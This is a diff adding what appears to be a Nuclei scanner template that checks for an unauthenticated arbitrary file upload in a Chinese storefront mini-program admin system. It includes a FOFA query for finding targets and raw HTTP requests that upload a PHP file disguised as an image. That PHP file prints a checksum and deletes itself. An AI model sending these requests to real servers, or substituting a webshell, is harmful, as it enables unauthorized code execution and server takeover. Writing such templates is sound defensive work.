@@ -1,0 +1,49 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: uploadfile
+          part: body
+          regex:
+            - ([0-9]+/\w+\.php)
+          type: regex
+      raw:
+        - |
+          POST /comadmin/Remote/onepic_uploade?file=file HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0p5OtH5zz
+
+          ------WebKitFormBoundaryBiKyL9D0p5OtH5zz
+          Content-Disposition: form-data; name="file"; filename="{{username}}.php"
+          Content-Type: image/jpeg
+
+          <?php print(111*222);unlink(__FILE__);?>
+          ------WebKitFormBoundaryBiKyL9D0p5OtH5zz--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - "24642"
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /upimages/{{uploadfile}} HTTP/1.1
+          Host: {{Hostname}}
+id: wannengmendian-onepic_uploade-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/comhome/cases/index.html"
+        万能门店小程序管理系统 onepic_uploade 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 万能门店小程序管理系统 onepic_uploade  任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/aL7JiraUsfsEWp3dJ0IGUQ?token=1015546094&lang=zh_CN
+    severity: high
+    tags:
+        - jira
+variables:
+    username: '{{to_lower(rand_base(6))}}'
